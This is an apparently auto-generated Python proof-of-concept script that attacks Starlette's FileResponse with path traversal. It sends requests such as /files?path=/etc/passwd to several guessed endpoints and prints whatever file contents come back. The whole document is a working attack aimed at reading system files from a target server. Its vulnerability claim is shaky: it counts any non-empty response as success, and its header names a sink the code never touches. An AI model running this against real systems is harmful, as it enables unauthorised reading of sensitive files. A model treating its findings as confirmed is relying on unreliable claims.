#!/usr/bin/env python3
# PoC for starlette (/home/xcy/.local/lib/python3.14/site-packages/starlette)
# Path: lfi-007
# Sink: _handle_multiple_ranges
# Auto-generated — run with: python3 lfi_fileresponse_class_uses_self__handle_multiple_ranges.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Starlette FileResponse LFI (Path Traversal)
Vulnerability: FileResponse uses self.path directly in anyio.open_file without sanitization.
If self.path is user-controlled (e.g., from URL parameter), an attacker can read arbitrary files.

This PoC demonstrates reading /etc/passwd via path traversal.
"""

import argparse
import sys
import urllib.request
import urllib.error
import socket

def exploit(target_url, file_to_read="/etc/passwd"):
    """
    Attempts to read an arbitrary file via path traversal in Starlette's FileResponse.
    
    Args:
        target_url: Base URL of the vulnerable Starlette application (e.g., http://localhost:8000)
        file_to_read: Absolute path of the file to read (default: /etc/passwd)
    """
    # Construct the malicious path - using absolute path since FileResponse doesn't sanitize
    # The path is passed directly to anyio.open_file, so absolute paths work
    malicious_path = file_to_read
    
    # Build the full URL - assuming the vulnerable endpoint accepts a 'path' parameter
    # or the path is part of the URL path itself
    # Common patterns: /files?path=..., /download?file=..., or /files/{path}
    # We'll try multiple common patterns
    
    patterns = [
        f"{target_url}/files?path={malicious_path}",
        f"{target_url}/download?file={malicious_path}",
        f"{target_url}/static/{malicious_path}",
        f"{target_url}/media/{malicious_path}",
        f"{target_url}/{malicious_path}",
    ]
    
    for url in patterns:
        try:
            print(f"[*] Trying: {url}")
            req = urllib.request.Request(url, method='GET')
            
            # Set a timeout to avoid hanging
            response = urllib.request.urlopen(req, timeout=10)
            
            # Read the response
            content = response.read()
            
            # Check if we got meaningful content (not just an error page)
            if content and len(content) > 0:
                print(f"[+] Success! Status: {response.status}")
                print(f"[+] Content length: {len(content)} bytes")
                print(f"[+] Content preview:\n{content[:500].decode('utf-8', errors='replace')}")
                
                # If we got /etc/passwd content, that's a clear indicator
                if b"root:" in content or b"nobody:" in content:
                    print("[!] Confirmed: Successfully read /etc/passwd!")
                    return True
                else:
                    print("[*] Got response but content doesn't look like /etc/passwd")
                    print("[*] This might still indicate LFI if the file exists but has different content")
                    return True
            else:
                print("[-] Empty response received")
                
        except urllib.error.HTTPError as e:
            print(f"[-] HTTP Error {e.code}: {e.reason}")
            if e.code == 404:
                print("    (Endpoint not found, trying next pattern...)")
            elif e.code == 403:
                print("    (Access forbidden - might have some protection)")
            elif e.code == 500:
                print("    (Server error - might have crashed or path is invalid)")
        except urllib.error.URLError as e:
            print(f"[-] URL Error: {e.reason}")
            if isinstance(e.reason, socket.timeout):
                print("    (Connection timed out)")
            else:
                print("    (Connection refused or DNS resolution failed)")
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
    
    print("\n[*] All patterns exhausted. The vulnerability might require a different endpoint.")
    print("[*] Try adjusting the patterns list based on the actual application routes.")
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for Starlette FileResponse LFI vulnerability",
        epilog="Example: python3 starlette_lfi_poc.py http://localhost:8000"
    )
    parser.add_argument("target", help="Target URL (e.g., http://localhost:8000)")
    parser.add_argument(
        "--file", 
        default="/etc/passwd", 
        help="File to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--safe", 
        action="store_true",
        help="Use a safe payload (read /etc/hostname instead of /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    # Ensure URL has proper format
    target = args.target.rstrip('/')
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    file_to_read = args.file
    if args.safe:
        file_to_read = "/etc/hostname"  # Safe file that won't expose sensitive data
    
    print(f"[*] Starlette FileResponse LFI PoC")
    print(f"[*] Target: {target}")
    print(f"[*] File to read: {file_to_read}")
    print()
    
    success = exploit(target, file_to_read)
    
    if success:
        print("\n[+] Vulnerability confirmed!")
        sys.exit(0)
    else:
        print("\n[-] Could not confirm vulnerability with the tested patterns.")
        print("[*] The application might not be vulnerable, or the endpoint is different.")
        sys.exit(1)

if __name__ == "__main__":
    main()
